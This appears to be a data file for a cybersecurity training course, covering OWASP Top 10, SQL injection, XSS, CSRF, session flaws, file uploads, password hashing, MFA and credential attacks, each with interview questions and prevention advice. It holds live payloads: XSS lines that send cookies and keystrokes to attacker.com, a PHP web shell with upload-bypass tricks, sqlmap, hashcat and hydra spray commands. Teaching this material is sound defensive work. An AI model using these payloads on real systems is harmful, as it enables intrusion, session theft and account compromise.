const M6={title:'Web Security',topics:[
{title:'OWASP Top 10',
def:'The OWASP Top 10 is the definitive list of the most critical web application security risks, updated every few years based on real-world data.',
commands:tbl([['Rank','Risk','Description'],['A01','Broken Access Control','Users can act outside intended permissions — #1 most common'],['A02','Cryptographic Failures','Sensitive data exposed due to weak/missing encryption'],['A03','Injection','SQL, NoSQL, command, LDAP injection attacks'],['A04','Insecure Design','Security flaws in application architecture/design'],['A05','Security Misconfiguration','Default configs, unnecessary features, verbose errors'],['A06','Vulnerable & Outdated Components','Libraries/frameworks with known CVEs'],['A07','Authentication Failures','Weak auth, credential stuffing, session management flaws'],['A08','Software & Data Integrity Failures','Deserialization, CI/CD pipeline attacks, unsigned updates'],['A09','Logging & Monitoring Failures','Insufficient logging, slow breach detection'],['A10','Server-Side Request Forgery (SSRF)','Server makes requests to internal resources on attacker\'s behalf']]),
why:'OWASP Top 10 is referenced in interviews, certifications, and real-world assessments. Understanding each risk is foundational for web security.',
beginner:'Think of OWASP Top 10 as the "most wanted" list of web vulnerabilities. If you learn to find and fix these 10, you cover 80% of real web security issues.',
interview:[{q:'What is OWASP Top 10?',a:'A regularly updated list of the 10 most critical web application security risks, maintained by the Open Web Application Security Project.'},{q:'What is #1 in OWASP Top 10 (2021)?',a:'Broken Access Control — users performing actions beyond their permissions (e.g., accessing other users\' data, admin functions without authorisation).'}],
summary:'OWASP Top 10 2021: A01=Broken Access Control | A03=Injection | A07=Auth Failures. Visit owasp.org. Practice at WebGoat, DVWA, PortSwigger Web Academy.'},

{title:'SQL Injection (SQLi)',
def:'SQL Injection injects malicious SQL code into input fields to manipulate the backend database query, potentially leaking data, bypassing auth, or executing commands.',
why:'SQLi is in every real-world pentest methodology and remains one of the most dangerous web vulnerabilities (A03 in OWASP).',
beginner:'Imagine a login form sends: SELECT * FROM users WHERE user=\'YOURINPUT\'. If you type admin\'-- the query becomes SELECT * FROM users WHERE user=\'admin\'-- (everything after -- is a comment — password check is gone!).',
technical:'Types: In-band (error-based, union-based), Blind (boolean, time-based), Out-of-band. Prevention: parameterised queries/prepared statements — never string concatenation. WAF provides additional but not sole protection.',
commands:cb('SQL Injection Testing',`# BASIC TESTS (add to any parameter)
'                    # Single quote — look for SQL error
''                   # Escaped quote
' OR 1=1 --          # Classic bypass (comment rest)
' OR '1'='1
admin'--             # Login bypass (comment password check)

# UNION-BASED (extract data)
' ORDER BY 3--       # Find number of columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,NULL FROM users--

# TIME-BASED BLIND (no visible output)
'; IF(1=1) WAITFOR DELAY '0:0:5'--   # MSSQL
' AND SLEEP(5)--                      # MySQL

# DETECT ERROR MESSAGES
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--  # MySQL version

# AUTOMATED (SQLMap)
sqlmap -u "http://target/?id=1" --dbs
sqlmap -r request.txt --dump

# PREVENTION (correct approach)
# PHP PDO (parameterised query)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

# Python SQLAlchemy
user = session.query(User).filter(User.id == user_id).first()`),
example:'A login form with: SELECT * FROM users WHERE user=\'admin\' AND pass=\'password\'. Injecting admin\'-- bypasses authentication because the password check is commented out.',
mistakes:['Testing SQLi on production systems without authorisation','Relying only on input sanitisation (use parameterised queries)','Forgetting to test numeric parameters (id=1 → id=1 OR 1=1)'],
interview:[{q:'How do parameterised queries prevent SQL injection?',a:'The query structure is defined first with placeholders (?), then data is passed separately. The database treats the input as pure data, never as SQL code — injection is impossible.'},{q:'What is blind SQL injection?',a:'SQLi where no data is returned in the response. The attacker infers information from boolean responses (different content/length) or time delays (SLEEP function).'}],
summary:'SQLi=inject SQL into queries. \' OR 1=1 --=classic bypass. Union-based=extract data. Blind=no output, use boolean/time. Prevention=PARAMETERISED QUERIES always.'},

{title:'Cross-Site Scripting (XSS)',
def:'XSS injects malicious JavaScript into web pages viewed by other users. The victim\'s browser executes the attacker\'s script, enabling cookie theft, phishing, and keylogging.',
why:'XSS is #3 web vulnerability by frequency. Stored XSS can impact all users of a site. Cookie theft via XSS bypasses authentication entirely.',
beginner:'Imagine a comments section on a website. You post a comment containing JavaScript instead of text. Every user who views that page has the script executed in their browser — as if the website itself ran it.',
technical:'Stored XSS: script saved in DB, served to all users (most dangerous). Reflected XSS: script in URL, requires user to click. DOM XSS: manipulates DOM client-side. Prevention: output encoding + CSP + HttpOnly cookies.',
commands:cb('XSS Testing Payloads',`# BASIC TEST
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

# ATTRIBUTE INJECTION
"><script>alert('XSS')</script>
' onmouseover='alert(1)

# ALTERNATIVE TAGS (bypass filters)
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>

# FILTER BYPASS
<ScRiPt>alert('XSS')</sCrIpT>       # Case variation
<scr<script>ipt>alert('XSS')</scr</script>ipt>  # Nested
<script>alert(String.fromCharCode(88,83,83))</script>  # Encoded

# COOKIE STEALING (stored XSS)
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>

# KEYLOGGER
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/log?k='+e.key)
}
</script>

# PREVENTION
# 1. Output encode ALL user input before displaying:
htmlspecialchars($input, ENT_QUOTES, 'UTF-8')   # PHP
# 2. Content Security Policy header:
Content-Security-Policy: default-src 'self'
# 3. HttpOnly cookie flag (prevents JS access to cookies)`),
interview:[{q:'What are the three types of XSS?',a:'Stored (persistent — in database, affects all users), Reflected (in URL, requires clicking a link), DOM-based (client-side manipulation, no server interaction).'},{q:'What is the most effective XSS prevention?',a:'Output encoding — HTML-encode all user input before rendering it in the page. CSP headers as defence-in-depth.'}],
summary:'XSS=inject JS into pages others see. Stored=most dangerous | Reflected=URL-based | DOM=client-side. Test: <script>alert(1)</script>. Prevention: output encoding+CSP+HttpOnly.'},

{title:'CSRF — Cross-Site Request Forgery',
def:'CSRF tricks an authenticated user\'s browser into sending a forged request to a web app where they\'re logged in, performing actions without their knowledge.',
why:'CSRF exploits trust between a website and a user\'s browser. Can cause fund transfers, account changes, or data deletion using victim\'s session.',
beginner:'You\'re logged into your bank. Attacker sends you a link to a malicious page containing an invisible image: <img src="bank.com/transfer?to=hacker&amount=1000">. Your browser automatically sends that request with your bank cookies.',
commands:cb('CSRF Testing & Prevention',`# CSRF ATTACK EXAMPLE
<!-- Malicious page on attacker.com -->
<!-- Victim visits this while logged into bank.com -->
<html><body onload="document.getElementById('f').submit()">
  <form id="f" action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker_account">
    <input name="amount" value="10000">
  </form>
</body></html>

# TESTING FOR CSRF
1. Log in to target application
2. Intercept a sensitive POST request in Burp Suite
3. Send to Repeater
4. Remove the CSRF token from the request
5. If request still succeeds → CSRF vulnerability!

# CSRF PREVENTION (server-side)
1. CSRF Tokens (most common):
   <input type="hidden" name="csrf_token" value="RANDOM_TOKEN">
   Server validates token matches user session

2. SameSite Cookie attribute:
   Set-Cookie: session=abc; SameSite=Strict
   (Strict = never sent cross-site | Lax = GET only)

3. Verify Origin/Referer headers

# XSS vs CSRF
  XSS  = attacker's JS runs in victim's browser AS the website
  CSRF = attacker's page sends forged request USING victim's session`),
interview:[{q:'How does a CSRF token prevent CSRF attacks?',a:'The server includes a unique random token in each form. On submission, the server validates the token matches the user\'s session. An attacker cannot guess this token from another origin.'},{q:'What is the SameSite cookie attribute?',a:'Controls when cookies are sent cross-site. SameSite=Strict: never sent in cross-site requests. SameSite=Lax: sent on top-level navigation GET requests only. Both help prevent CSRF.'}],
summary:'CSRF=forge requests using victim\'s session. Browser sends cookies automatically=attack vector. Prevention: CSRF tokens+SameSite cookies. Different from XSS: CSRF forges requests, XSS injects scripts.'},

{title:'Authentication & Session Security',
def:'Authentication flaws and session management vulnerabilities allow attackers to bypass login, steal sessions, or impersonate other users.',
commands:cb('Authentication Vulnerabilities',`# SESSION HIJACKING
# Methods to steal session cookie:
1. XSS: <script>fetch('http://attacker/?c='+document.cookie)</script>
2. Network sniffing: Wireshark on HTTP traffic
3. Predictable session IDs: session=12345 → try session=12346

# SESSION FIXATION
# Attacker sets a known session ID before victim logs in
# If server doesn't regenerate session on login → attacker can use it

# INSECURE DIRECT OBJECT REFERENCE (IDOR)
GET /invoice?id=1234     # Change to id=1235 → access other user's invoice
GET /account?user=alice  # Change to user=bob → IDOR

# BROKEN AUTHENTICATION TEST CHECKLIST
□ Default credentials: admin/admin, admin/password
□ Brute force: no lockout after X failed attempts?
□ Credential stuffing: try breach databases
□ Username enumeration: different errors for valid/invalid user?
□ Password reset: predictable tokens? No expiry?
□ "Remember me" token: persistent token securely generated?

# SECURE COOKIE FLAGS
Set-Cookie: session=token; HttpOnly; Secure; SameSite=Strict
  HttpOnly  → No JavaScript access (stops XSS cookie theft)
  Secure    → HTTPS only (stops network sniffing)
  SameSite  → Prevents CSRF

# SESSION MANAGEMENT BEST PRACTICES
- Regenerate session ID after successful login
- Short session timeout (15-30 min idle)
- Secure session ID: 128+ bits of randomness
- Invalidate session on logout (server-side)`),
interview:[{q:'What is session hijacking?',a:'Stealing a user\'s valid session token to impersonate them without knowing their credentials.'},{q:'What three cookie flags protect session cookies?',a:'HttpOnly (blocks JS access), Secure (HTTPS only), SameSite (prevents CSRF).'}],
summary:'Session cookie=access key. HttpOnly+Secure+SameSite=cookie protection. IDOR=access others\' objects by changing IDs. Regenerate session ID after login. Short session timeouts.'},

{title:'File Upload Vulnerabilities',
def:'File upload flaws allow attackers to upload malicious files (PHP shells) that can be executed, leading to Remote Code Execution (RCE).',
commands:cb('File Upload Attack & Defence',`# ATTACK WORKFLOW
1. Identify file upload endpoint
2. Upload PHP web shell:

<?php system($_GET['cmd']); ?>   # Save as shell.php

3. Bypass validation:
   - Change extension: shell.php → shell.php.jpg
   - Change Content-Type: image/jpeg (keep PHP content)
   - Null byte: shell.php%00.jpg (older PHP)
   - Double extension: shell.jpg.php
   - Magic bytes: add GIF89a; at start of PHP file → shell.php.gif

4. Find where file is uploaded:
   /uploads/, /images/, /files/

5. Access and execute:
   http://target.com/uploads/shell.php?cmd=whoami
   http://target.com/uploads/shell.php?cmd=id;cat+/etc/passwd

# TESTING
□ Upload .php file — does it execute?
□ Rename to .php.jpg — does it still execute?
□ Change Content-Type header in Burp — accepted?
□ Check upload directory is browseable
□ Try zip/archive containing PHP (zip slip attack)

# PREVENTION
✓ Whitelist extensions: ONLY jpg, png, pdf, docx
✓ Validate MIME type (server-side, not just Content-Type header)
✓ Rename uploaded files to random name (no extension control)
✓ Store uploads OUTSIDE web root
✓ Serve uploads through application (never directly)
✓ Run antivirus scan on uploads
✓ Disable PHP execution in upload directory (.htaccess: php_flag engine off)`),
interview:[{q:'How does a file upload vulnerability lead to RCE?',a:'Attacker uploads a PHP web shell to a web server. If the file is accessible via URL and the server executes PHP files, the attacker can run OS commands through it.'},{q:'What is the most effective file upload prevention?',a:'Store files outside the web root (cannot be executed via URL) + whitelist allowed extensions server-side + rename uploaded files.'}],
summary:'Upload vuln=upload shell→RCE. Bypass: change extension/Content-Type/magic bytes. Prevention: whitelist extensions+rename files+store outside web root+disable PHP execution in upload dir.',
quiz:qz('Which OWASP Top 10 2021 risk is #1 (most common)?',['SQL Injection','XSS','Broken Access Control','Security Misconfiguration'],2,'A01:2021 Broken Access Control moved from #5 to #1 — the most common web vulnerability, found in 94% of applications tested.')}
]};

const M7={title:'Password & Authentication Security',topics:[
{title:'Password Hashing',
def:'Password hashing is a one-way cryptographic transformation storing a fixed-length hash instead of the plaintext password. It cannot be mathematically reversed.',
why:'Password hashes protect users if a database is stolen. Using weak algorithms (MD5, SHA-1) means attackers can crack hashes in seconds.',
commands:cb('Hashing Reference',`# HASH ALGORITHM COMPARISON
Algorithm  | Output   | Security      | Use for passwords?
MD5        | 128-bit  | BROKEN        | NEVER
SHA-1      | 160-bit  | BROKEN        | NEVER
SHA-256    | 256-bit  | OK for files  | No (too fast to crack)
bcrypt     | 60 chars | GOOD          | YES ✓
scrypt     | Variable | GOOD          | YES ✓
Argon2id   | Variable | BEST (NIST)   | YES ✓✓✓

# WHY bcrypt > SHA-256 for passwords?
# bcrypt is deliberately slow (cost factor 12 = 2^12 rounds)
# SHA-256 hashes 10M passwords/sec → bcrypt ≈ 100/sec

# SALTING
# Salt = random string added before hashing
# "password" + "xK8$mN2" → bcrypt(password+salt) → unique hash
# Without salt: same password → same hash (rainbow table attack!)
# bcrypt includes salt in the stored hash automatically

# IDENTIFYING HASH TYPES
5f4dcc3b5aa765d61d8327deb882cf99  → MD5 (32 chars)
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  → SHA-1 (40 chars)
$2b$12$...  → bcrypt (starts with $2b$)
$argon2id$... → Argon2

# TOOLS
hash-identifier <hash>
hashid <hash>

# CRACKING MD5 (John)
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
john --show hash.txt   # → password`),
interview:[{q:'What is the difference between hashing and encryption?',a:'Hashing is one-way — cannot be reversed. Encryption is two-way — can be decrypted with the key. Passwords should be hashed, not encrypted.'},{q:'What is a salt in password hashing?',a:'A random unique string added to each password before hashing. Ensures identical passwords produce different hashes — defeats rainbow table attacks.'}],
summary:'Hashing=one-way | Encryption=two-way. MD5/SHA-1=broken for passwords. Use bcrypt/Argon2. Salt=prevents rainbow tables. Cost factor=makes cracking slower (bcrypt).'},

{title:'Multi-Factor Authentication (MFA)',
def:'MFA requires two or more different authentication factors: something you know (password), something you have (TOTP app), something you are (biometric).',
commands:tbl([['Factor','Type','Examples','Security'],['Password/PIN','Know','Classic login','Low alone'],['TOTP Code','Have','Google Authenticator, Authy','High'],['SMS OTP','Have','Text message code','Medium (SIM swap risk)'],['Hardware Key','Have','YubiKey (FIDO2/WebAuthn)','Very High'],['Biometric','Are','Fingerprint, Face ID','High'],['Push Notification','Have','Duo, Microsoft Authenticator','High']]),
why:'MFA is the single most effective control against account compromise. Stops credential stuffing, brute force, and phishing-obtained passwords.',
commands2:al('tip','<strong>Security ranking:</strong> Hardware key (FIDO2) > TOTP app > Push notification > SMS OTP. SMS is vulnerable to SIM swapping — always recommend TOTP or hardware keys over SMS.'),
interview:[{q:'Why is TOTP more secure than SMS-based 2FA?',a:'SMS is vulnerable to SIM swapping (attacker transfers victim\'s number to their SIM). TOTP codes are generated locally on the device using a shared secret, not transmitted via the phone network.'},{q:'What is FIDO2/WebAuthn?',a:'A phishing-resistant authentication standard using hardware security keys (YubiKey). The key signs a challenge from the specific domain — cannot be used on phishing sites.'}],
summary:'MFA=2+ factors from different categories. FIDO2/YubiKey=most secure. TOTP>SMS. MFA stops credential stuffing and most phishing attacks. Authenticator apps: Google Authenticator, Authy.'},

{title:'Brute Force & Credential Attacks',
def:'Various attack techniques to compromise credentials by trying many passwords or using previously leaked data.',
commands:cb('Attack Types & Tools',`# ATTACK TYPES
Brute Force      → Try all possible combinations (slow, complete)
Dictionary       → Try words from a wordlist (fast, common)
Credential Stuffing → Use leaked user:pass pairs on other sites
Password Spray   → One password against many accounts (avoids lockout)
Rainbow Table    → Precomputed hash lookup (defeated by salting)

# HASHCAT (GPU — orders of magnitude faster than CPU)
hashcat -m 0    hash.txt rockyou.txt    # MD5 dictionary
hashcat -m 1000 hash.txt rockyou.txt    # NTLM (Windows hashes)
hashcat -m 3200 hash.txt rockyou.txt    # bcrypt (slow)
hashcat -m 1800 hash.txt rockyou.txt    # SHA-512crypt (Linux)

# Brute force (mask attack)
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d  # Capital+4lower+2digits
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a  # 6-char all types

# Rules (modify wordlist words)
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# ONLINE CRACKING
# https://crackstation.net/ — fast online MD5/SHA1/NTLM cracking
# https://hashes.com/en/decrypt/hash

# PASSWORD SPRAY (low and slow, avoids lockout)
for user in admin alice bob charlie; do
  hydra -l $user -p Summer2026! ssh://192.168.1.100 -t 1 -W 30
done

# CREDENTIAL STUFFING TOOLS
# Use Hydra with known user:pass pairs from breach databases
# Have I Been Pwned: https://haveibeenpwned.com/`),
interview:[{q:'What is credential stuffing?',a:'Using username/password pairs leaked from one breach to try on other websites, exploiting password reuse. Effective because 65%+ of users reuse passwords.'},{q:'How does password spraying differ from brute force?',a:'Brute force tries many passwords for one account (triggers lockout). Password spray tries one common password across many accounts — stays under lockout thresholds.'}],
summary:'Hashcat=GPU cracking (much faster). NTLM=m 1000 | MD5=m 0 | bcrypt=m 3200. Credential stuffing=breached passwords reused. Password spray=avoids lockout. Salt defeats rainbow tables.'}
]};
